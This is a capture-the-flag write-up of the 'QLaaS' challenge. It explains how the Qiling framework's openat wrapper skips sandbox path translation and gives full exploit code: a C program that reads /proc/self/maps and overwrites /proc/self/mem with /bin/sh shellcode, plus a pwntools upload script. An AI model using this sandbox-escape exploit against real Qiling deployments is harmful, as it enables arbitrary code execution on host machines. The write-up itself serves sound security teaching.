QLaaS was a challenge that allowed the user to upload a binary file to be executed
inside the Qiling framework sandbox.

https://github.com/qilingframework/qiling

Qiling is a python sandbox that, among other things, locks the program in a directory in
a similar way a chroot does. It implements wrappers on pretty much every syscall and resolves
the real path before passing them to the system by prepending the the directory we are supposed
to be locked on to every syscall that accesses the file system. For example,
`execve("/readflag",0,0)` would become `execve("<Qiling-rootfs>/readflag",0,0)` before being
invoked. The two functions used to switch between the real path of a file in the system and the
relative paths inside the sandboxed directory are `transform_to_real_path` and
`transform_to_relative_path`:

qiling/os/path.py
```py
    def transform_to_real_path(self, path: str) -> str:
        real_path = self.convert_path(self.ql.rootfs, self.cwd, path)

        if os.path.islink(real_path):
            link_path = Path(os.readlink(real_path))

            if not link_path.is_absolute():
                real_path = Path(os.path.join(os.path.dirname(real_path), link_path))

            # resolve multilevel symbolic link
            if not os.path.exists(real_path):
                path_dirs = link_path.parts

                if link_path.is_absolute():
                    path_dirs = path_dirs[1:]

                for i in range(len(path_dirs) - 1):
                    path_prefix = os.path.sep.join(path_dirs[:i+1])
                    real_path_prefix = self.transform_to_real_path(path_prefix)
                    path_remain = os.path.sep.join(path_dirs[i+1:])
                    real_path = Path(os.path.join(real_path_prefix, path_remain))

                    if os.path.exists(real_path):
                        break

        return str(real_path.absolute())

    # The `relative path` here refers to the path which is relative to the rootfs.
    def transform_to_relative_path(self, path: str) -> str:
        return str(Path(self.cwd) / path)
```


Our first idea was to bypass `transform_to_real_path` using symlinks. If _real\_path_ pointed to `/readflag`, we could `execve` and win. The `normalize` function has no vulnerabilities, apparently, but we could try to use symlink to bypass references:

```py
# /symlink  -> ../../../etc/passwd

# convert_path("/symlink") -> /<Qiling-rootfs>/symlink
real_path = self.convert_path(self.ql.rootfs, self.cwd, path)

# if "/<Qiling-rootfs>/symlink" is a link, read then
if os.path.islink(real_path):
    # link_path = ../../../etc/passwd
    link_path = Path(os.readlink(real_path))

    if not link_path.is_absolute():
        # concat real_path + link_path, then:
        # real_path = /<Qiling-rootfs>/../../../etc/passwd
        real_path = Path(os.path.join(os.path.dirname(real_path), link_path))
```

Now if we read (or exec :D) this _real\_path_ it will hopefully point to `/etc/passwd`, but unfortunately:

![](https://i.ibb.co/fGK72GD/symlink.png)

> It's not possible to use symlinks to escape as the syscall is not implemented :(


With our fist option failed we started looking for bugs again and found one that happened due to a syscall wrapper not converting the paths before calling
the syscall, and that was `openat()`. For some reason the lines that compute the real path and
the relative path were commented out and those weren't used at all, instead, the wrapper simply forwards
whatever path the program tries to access, allowing the program to access files outside the sandbox's
directory and read/write to them.

qiling/os/posix/syscall/fcntl.py
```py
def ql_syscall_creat(ql: Qiling, filename: int, mode: int):
    flags = posix_open_flags["O_WRONLY"] | posix_open_flags["O_CREAT"] | posix_open_flags["O_TRUNC"]

    path = ql.os.utils.read_cstring(filename)
    real_path = ql.os.path.transform_to_real_path(path)
    relative_path = ql.os.path.transform_to_relative_path(path)

    flags &= 0xffffffff
    mode &= 0xffffffff

    idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1)

    if idx == -1:
        regreturn = -ENOMEM 
    else:
        try:
            if ql.archtype== QL_ARCH.ARM:
                mode = 0

            flags = ql_open_flag_mapping(ql, flags)
            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode)
            regreturn = idx
        except QlSyscallError as e:
            regreturn = -e.errno

    ql.log.debug("creat(%s, 0o%o) = %d" % (relative_path, mode, regreturn))

    if regreturn >= 0 and regreturn != 2:
        ql.log.debug(f'File found: {real_path:s}')
    else:
        ql.log.debug(f'File not found {real_path:s}')

    return regreturn

def ql_syscall_openat(ql: Qiling, fd: int, path: int, flags: int, mode: int):
    file_path = ql.os.utils.read_cstring(path)
    # real_path = ql.os.path.transform_to_real_path(path)
    # relative_path = ql.os.path.transform_to_relative_path(path)

    flags &= 0xffffffff
    mode &= 0xffffffff

    idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1)

    if idx == -1:
        regreturn = -EMFILE
    else:
        try:
            if ql.archtype== QL_ARCH.ARM:
                mode = 0

            flags = ql_open_flag_mapping(ql, flags)
            fd = ql.unpacks(ql.pack(fd))

            if 0 <= fd < NR_OPEN:
                dir_fd = ql.os.fd[fd].fileno()
            else:
                dir_fd = None

            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(file_path, flags, mode, dir_fd)

            regreturn = idx
        except QlSyscallError as e:
            regreturn = -e.errno
            
    ql.log.debug(f'openat(fd = {fd:d}, path = {file_path}, mode = {mode:#o}) = {regreturn:d}')

    return regreturn
```

The way we leveraged this to a sandbox escape was reading from `/proc/self/maps` and writing
to `/proc/self/mem`, this way we can get the offset of python's executable memory and overwrite
it with a nopsled + shellcode, so whenever any function returns to that section, our shellcode will
be executed.

/proc/self/maps
```
5611d5cfa000-5611d5cfc000 r--p 00000000 08:01 28574821                   /usr/bin/cat
5611d5cfc000-5611d5d01000 r-xp 00002000 08:01 28574821                   /usr/bin/cat
5611d5d01000-5611d5d04000 r--p 00007000 08:01 28574821                   /usr/bin/cat
5611d5d04000-5611d5d05000 r--p 00009000 08:01 28574821                   /usr/bin/cat
5611d5d05000-5611d5d06000 rw-p 0000a000 08:01 28574821                   /usr/bin/cat
5611d6758000-5611d6779000 rw-p 00000000 00:00 0                          [heap]
7fa19f5fd000-7fa19f61f000 rw-p 00000000 00:00 0 
7fa19f61f000-7fa19f907000 r--p 00000000 08:01 28843236                   /usr/lib/locale/locale-archive
7fa19f907000-7fa19f909000 rw-p 00000000 00:00 0 
7fa19f909000-7fa19f92f000 r--p 00000000 08:01 28579427                   /usr/lib/libc-2.33.so
7fa19f92f000-7fa19fa7a000 r-xp 00026000 08:01 28579427                   /usr/lib/libc-2.33.so
7fa19fa7a000-7fa19fac6000 r--p 00171000 08:01 28579427                   /usr/lib/libc-2.33.so
7fa19fac6000-7fa19fac9000 r--p 001bc000 08:01 28579427                   /usr/lib/libc-2.33.so
7fa19fac9000-7fa19facc000 rw-p 001bf000 08:01 28579427                   /usr/lib/libc-2.33.so
7fa19facc000-7fa19fad7000 rw-p 00000000 00:00 0 
7fa19faf7000-7fa19faf8000 r--p 00000000 08:01 28579416                   /usr/lib/ld-2.33.so
7fa19faf8000-7fa19fb1c000 r-xp 00001000 08:01 28579416                   /usr/lib/ld-2.33.so
7fa19fb1c000-7fa19fb25000 r--p 00025000 08:01 28579416                   /usr/lib/ld-2.33.so
7fa19fb25000-7fa19fb27000 r--p 0002d000 08:01 28579416                   /usr/lib/ld-2.33.so
7fa19fb27000-7fa19fb29000 rw-p 0002f000 08:01 28579416                   /usr/lib/ld-2.33.so
7ffd79b82000-7ffd79ba3000 rw-p 00000000 00:00 0                          [stack]
7ffd79bd0000-7ffd79bd4000 r--p 00000000 00:00 0                          [vvar]
7ffd79bd4000-7ffd79bd6000 r-xp 00000000 00:00 0                          [vdso]
```

We can parse this output to get the offset of the executable area, then we can
write to /proc/self/mem at that offset with our shellcode prepended by a padding
of nops.

exploit.c
```c
#define _POSIX1_SOURCE 2
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <fcntl.h>


/* Read a file outside the sandbox */
char* read_file(char* filename){
  unsigned long length;
  int fd = openat(1, filename, O_RDONLY);
  
  length = lseek(fd, 0, SEEK_END)+1;
  lseek(fd, 0, SEEK_SET);

  if(length == 0){
    length = 6000;
  }

  char *buf = malloc(length);

  read(fd, buf, length);
  write(1, buf, length);
  
  return buf;
}


/* execve("/bin/sh",0,0); */
char* generate_payload(){
  char* payload = malloc(0x1000);
  memset(payload, '\x90', 0x1000);

  char* shellcode = "H\xc7\xc0;\x00\x00\x00H\xbb/bin/sh\x00SH\x89\xe7H1\xf6H1\xd2\x0f\x05";
  memcpy(payload+(0x1000-30), shellcode, 29);

  return payload;
}

int main() {
  unsigned long x;
  char* buf;

  /* Read maps and parse executable offset */
  buf = read_file("/proc/self/maps");

  buf[98+13] = '\0';
  x = (unsigned long)strtol(buf+98, NULL, 16);


  /* Write shellcode to executable memory */
  int fd = openat(1, "/proc/self/mem", O_WRONLY);

  lseek(fd, x, SEEK_SET);

  char* payload = generate_payload();
  write(fd, payload, 0x1000);

}
```

We also used a simple python file to upload the binary file.

send.py
```py
#!/usr/bin/env python3
from pwn import *
import base64, os

# Compile
os.system('musl-gcc exploit.c -o exploit -static')

# B64 encode
base64_code = ''
with open('./exploit', 'rb') as code:
    raw_code = code.read()
    base64_code = base64.b64encode(raw_code)

# Send exploit
io = remote('47.242.149.197',7600)
io.recvuntil(b'Your Binary(base64):')
io.sendline(base64_code)

io.interactive()
```

FLAG: `rwctf{s0-many-vu1n_but-only-few-exploitable}`

- 0xTen
- Caue
- Esoj
- R3tr0
